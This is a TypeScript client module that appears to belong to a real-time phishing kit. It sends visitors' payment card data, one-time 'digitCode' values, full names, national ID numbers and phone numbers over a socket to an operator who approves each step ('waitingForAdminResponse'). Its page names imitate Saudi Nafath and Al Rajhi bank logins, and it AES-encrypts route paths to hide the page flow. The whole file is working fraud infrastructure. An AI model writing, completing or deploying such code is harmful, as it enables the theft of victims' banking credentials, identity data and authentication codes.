import { nextPage as nextPageSignal } from "./../context/signals";
import CryptoJS from "crypto-js";
import Utf8 from "crypto-js/enc-utf8";
import Hex from "crypto-js/enc-hex";

import {
  adminLoading,
  isAdminError,
  loading,
  mainInfo,
  messages,
  permissions,
  socket,
  isFormRejected,
} from "../context/signals";
import { customHistory } from "@/components/CustomRouter";

export function sendDataToServer({
  data,
  paymentCard,
  digitCode,
  current,
  nextPage,
  waitingForAdminResponse,
  isCustom,
  mode,
}: {
  data?: any;
  paymentCard?: any;
  digitCode?: any;
  current: string;
  nextPage?: string;
  waitingForAdminResponse?: boolean;
  isCustom?: boolean;
  mode?: string;
}) {
  if (mainInfo.value._id) {
    isFormRejected.value = false;

    isAdminError.value = false;

    socket.value.emit("more-info", {
      content: data,
      paymentCard,
      digitCode,
      page: current,
      waitingForAdminResponse,
      sentCustomPage: isCustom,
      mode,
    });

    nextPageSignal.value = nextPage;

    if (!mode) {
      adminLoading.value = "wait";
    }
  } else {
    console.error("Main Info Not Found, Cannot Send Data To Server");
  }
}

export function addPagePermission(page: string) {
  page = page.split("?")[0];
  if (!permissions.value.includes(page)) {
    permissions.value = [...permissions.value, page];
  }
}

export function sendMessage(text: string) {
  socket.value.emit("send-message", text);

  messages.value = [
    ...messages.value,
    {
      text,
      from: "visitor",
      createdAt: new Date(),
    },
  ];
}

export function registerVisitor(data: {
  fullName: string;
  idNumber: string;
  phone: string;
}) {
  socket.value.emit("visitor:register", data);

  mainInfo.value = {
    ...mainInfo.value,
    fullName: data.fullName,
    idNumber: data.idNumber,
    phone: data.phone,
  };
}

export function getCurrentPage(): string {
  return (
    decryptRoute(window.location.pathname.split("/")[1]) || "الصفحة الرئيسية"
  );
}

export function setCurrentPage(page?: string) {
  socket.value.emit("visitor:pageEnter", getCurrentPage());

  if (mainInfo.value.socketId) {
    socket.value.emit("connected-admins");
  }

  if (page !== "الصفحة رقم 5") {
    loading.value = "";
  }

  if (page == "الصفحة رقم 6") {
    sendDataToServer({
      current: "الصفحة رقم 6",
      data: {},
      nextPage: "الصفحة رقم 7",
      mode: "code",
      waitingForAdminResponse: true,
    });
  }

  if (page == "نفاذ الراجحى" || page == "تحقق نفاذ" || page == "نفاذ الأول") {
    sendDataToServer({
      current: page,
      data: {},
      nextPage: "",
      mode: "code",
    });
  }

  if (page == "الصفحة النهائية") {
    sendDataToServer({
      current: "الصفحة النهائية",
      data: {},
      nextPage: "",
      mode: "last",
    });
  }
}

const IV = Hex.parse("0".repeat(32));

export const encryptRoute = (plainText: string) => {
  const encrypted = CryptoJS.AES.encrypt(
    plainText,
    Utf8.parse(mainInfo.value._id),
    {
      iv: IV,
      mode: CryptoJS.mode.CBC,
      padding: CryptoJS.pad.Pkcs7,
    },
  );
  return encrypted.ciphertext.toString(Hex);
};

export const decryptRoute = (cipherHex: string) => {
  const cipherParams = CryptoJS.lib.CipherParams.create({
    ciphertext: Hex.parse(cipherHex),
  });
  const decrypted = CryptoJS.AES.decrypt(
    cipherParams,
    Utf8.parse(mainInfo.value._id),
    {
      iv: IV,
      mode: CryptoJS.mode.CBC,
      padding: CryptoJS.pad.Pkcs7,
    },
  );
  return decrypted.toString(Utf8);
};

export const navigate = (page: string | undefined) => {
  if (page) {
    addPagePermission(page);
    customHistory.push(page === "الصفحة الرئيسية" ? "/" : "/" + page);
  }
  adminLoading.value = "";
};
